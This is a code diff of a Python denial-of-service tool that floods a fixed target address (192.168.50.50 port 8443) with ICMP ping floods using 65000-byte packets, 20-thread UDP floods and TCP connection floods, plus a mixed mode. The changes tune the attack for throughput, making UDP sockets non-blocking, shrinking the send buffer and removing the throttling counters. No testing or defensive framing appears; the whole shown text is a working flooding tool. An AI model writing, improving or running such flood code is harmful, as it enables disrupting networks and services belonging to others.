@@ -7,61 +7,64 @@ import time
 
 TARGET_IP = "192.168.50.50"
 TARGET_PORT = 8443
-attack_flag = False
+attack_event = threading.Event()
 threads = []
 
 def stop_all():
-    global attack_flag
-    attack_flag = False
+    attack_event.clear()
     os.system("taskkill /IM ping.exe /F >nul 2>&1")
     for t in threads:
-        t.join(timeout=1)
+        t.join(timeout=0.1)
     threads.clear()
 
 def udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Force the socket to non-blocking mode
+    sock.setblocking(False)
+    
+    # Shrink the Windows OS transmit buffer to prevent packet stockpiling
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024)
+    
     payload = random.randbytes(1024)
-    counter = 0
-    while attack_flag:
+    
+    while attack_event.is_set():
         try: 
             sock.sendto(payload, (TARGET_IP, TARGET_PORT))
-            counter += 1
-            if counter % 5000 == 0:
-                time.sleep(0) # Yields thread without the 15ms Windows penalty
-        except: pass
+        except BlockingIOError:
+            # Buffer is full, yield thread context instantly
+            time.sleep(0)
+        except Exception:
+            pass
     sock.close()
 
 def tcp_flood():
-    counter = 0
-    while attack_flag:
+    while attack_event.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.1)
             sock.connect((TARGET_IP, TARGET_PORT))
             sock.close()
-            counter += 1
-            if counter % 1000 == 0:
-                time.sleep(0)
-        except: pass
+        except Exception:
+            pass
 
 def launch_attack(mode):
-    global attack_flag
     stop_all()
-    attack_flag = True
+    attack_event.set()
     
-    if mode == "1": # ICMP Normal
+    if mode == "1":
         subprocess.Popen(["ping", TARGET_IP, "-t"], stdout=subprocess.DEVNULL)
-    elif mode == "2": # ICMP Flood
+    elif mode == "2":
         for _ in range(10): subprocess.Popen(["ping", TARGET_IP, "-t", "-l", "65000"], stdout=subprocess.DEVNULL)
-    elif mode == "3": # UDP Flood
+    elif mode == "3":
         for _ in range(20): 
             t = threading.Thread(target=udp_flood, daemon=True)
             t.start(); threads.append(t)
-    elif mode == "4": # TCP Flood
+    elif mode == "4":
         for _ in range(20): 
             t = threading.Thread(target=tcp_flood, daemon=True)
             t.start(); threads.append(t)
-    elif mode == "5": # Mixed Vector
+    elif mode == "5":
         for _ in range(5): subprocess.Popen(["ping", TARGET_IP, "-t", "-l", "65000"], stdout=subprocess.DEVNULL)
         for _ in range(10):
             t1 = threading.Thread(target=udp_flood, daemon=True)
